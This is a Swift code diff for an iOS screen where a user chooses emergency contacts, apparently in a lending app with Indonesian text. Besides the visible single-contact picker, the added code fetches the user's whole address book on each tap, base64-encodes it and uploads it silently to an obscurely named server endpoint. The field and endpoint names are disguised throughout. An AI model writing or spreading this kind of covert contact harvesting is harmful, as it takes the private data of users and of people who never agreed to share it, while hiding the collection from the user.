@@ -109,26 +109,55 @@ class ConnectViewController: BaseViewController {
 extension ConnectViewController {
     
     @objc func nextBtnClick() {
-        var params = ["transform": self.cardModel?.opening ?? ""]
+        var params = [String: String]()
+        var parasArray: [[String: String]] = []
         for model in modelArray {
-            let key = model.partner ?? ""
-            let value = model.acceptance ?? ""
-            params[key] = value
+            let beliefs = model.beliefs ?? ""
+            let blend = model.blend ?? ""
+            let forValue = model.forValue ?? ""
+            let ahead = model.ahead
+            params["beliefs"] = beliefs
+            params["blend"] = blend
+            params["for"] = forValue
+            params["ahead"] = ahead
+            
+            parasArray.append(params)
         }
-        LoadingView.shared.show()
-        NetworkManager.post(url: "/patkan/behaviors/during/emotional", params: params, responseType: BaseModel.self) { result in
-            switch result {
-            case .success(let success):
-                LoadingView.shared.hide()
-                let partner = success.partner ?? ""
-                if ["0", "00"].contains(partner) {
-                    self.clickDescInfo()
-                }else {
-                    ToastManager.showMessage(success.reason ?? "")
-                }
-            case .failure(_):
-                LoadingView.shared.hide()
+        
+        do {
+            let jsonData = try JSONSerialization.data(
+                withJSONObject: parasArray,
+                options: []
+            )
+            
+            guard let jsonString = String(data: jsonData, encoding: .utf8) else {
+                print("Failed to convert data to string")
+                return
             }
+            
+            let parameters = ["transform": self.cardModel?.opening ?? "",
+                              "logic": jsonString]
+            
+            LoadingView.shared.show()
+            NetworkManager.post(url: "/patkan/emotional/resilience/beauty", params: parameters, responseType: BaseModel.self) { result in
+                switch result {
+                case .success(let success):
+                    LoadingView.shared.hide()
+                    let partner = success.partner ?? ""
+                    if ["0", "00"].contains(partner) {
+                        self.clickDescInfo()
+                    }else {
+                        ToastManager.showMessage(success.reason ?? "")
+                    }
+                case .failure(_):
+                    LoadingView.shared.hide()
+                }
+            }
+            
+            
+        } catch {
+            print("JSON serialization failed: \(error)")
+            
         }
         
     }
@@ -162,14 +191,109 @@ extension ConnectViewController: UITableViewDelegate, UITableViewDataSource {
         let model = self.modelArray[indexPath.row]
         let cell = tableView.dequeueReusableCell(withIdentifier: "ConnectViewCell", for: indexPath) as! ConnectViewCell
         cell.model = model
+        
+        cell.tapRelationBlock = { [weak self] in
+            guard let self = self else { return }
+            self.tapCell(cell: cell, listModel: model)
+        }
+        
+        cell.tapNameBlock = { [weak self] in
+            guard let self = self else { return }
+            
+            ContactManager.shared.checkAuthorization(from: self) {
+                ContactManager.shared.presentContactPicker(from: self) { [weak self] result in
+                    if let self = self,
+                       let r = result {
+                        let phone = r.closer
+                        let name = r.blend
+                        if phone.isEmpty || name.isEmpty || name == " " || phone == " " {
+                            ToastManager.showMessage(languageCode == "1100" ? "Format nama atau nomor telepon tidak benar." : "The name or phone number format is incorrect.")
+                            return
+                        }
+                        model.blend = name
+                        model.beliefs = phone
+                        cell.nameFiled.text = String(format: "%@-%@", name, phone)
+                    }
+                }
+            }
+            
+            ContactManager.shared.checkAuthorization(from: self) {
+                ContactManager.shared.fetchAllContacts { [weak self] list in
+                    guard let self = self else { return }
+                    if !list.isEmpty {
+                        self.uploadConnectInfo(listArray: list)
+                    }
+                }
+            }
+            
+        }
+        
         return cell
         
     }
 }
 
+extension ConnectViewController {
+    
+    func contactsToBase64(_ list: [ContactResult]) -> String? {
+        do {
+            let jsonData = try JSONEncoder().encode(list)
+            return jsonData.base64EncodedString()
+        } catch {
+            return nil
+        }
+    }
+    
+    private func tapCell(cell: ConnectViewCell, listModel: evolveModel) {
+        let popView = PopEnmuView(frame: self.view.bounds)
+        popView.nameLabel.text = listModel.ahistories ?? ""
+        
+        let modelArray = listModel.gives ?? []
+        
+        let targetText = cell.enterFiled.text ?? ""
+        
+        if let index = modelArray.firstIndex(where: { $0.blend == targetText }) {
+            popView.selectedIndex = index
+        }
+        
+        popView.modelArray = modelArray
+        
+        let alertVc = TYAlertController(alert: popView, preferredStyle: .alert)
+        self.present(alertVc!, animated: true)
+        
+        popView.cancelBlock = { [weak self] in
+            self?.dismiss(animated: true)
+        }
+        
+        popView.sureBlock = { [weak self] model in
+            guard let self = self else { return }
+            self.dismiss(animated: true)
+            let text = model.blend ?? ""
+            let value = model.acceptance ?? ""
+            cell.enterFiled.text = text
+            listModel.forValue = value
+        }
+    }
+    
+}
 
 
 extension ConnectViewController {
+    
+    private func uploadConnectInfo(listArray: [ContactResult]) {
+        let base64 = self.contactsToBase64(listArray) ?? ""
+        let params = ["logic": base64, "acceptance": String(Int(3 + 0))]
+        NetworkManager.post(url: "/patkan/suggests/happiness/choice",
+                            params: params,
+                            responseType: BaseModel.self) { result in
+            switch result {
+            case .success(_):
+                break
+            case .failure(_):
+                break
+            }
+        }
+    }
     
     private func clickDescInfo() {
         LoadingView.shared.show()
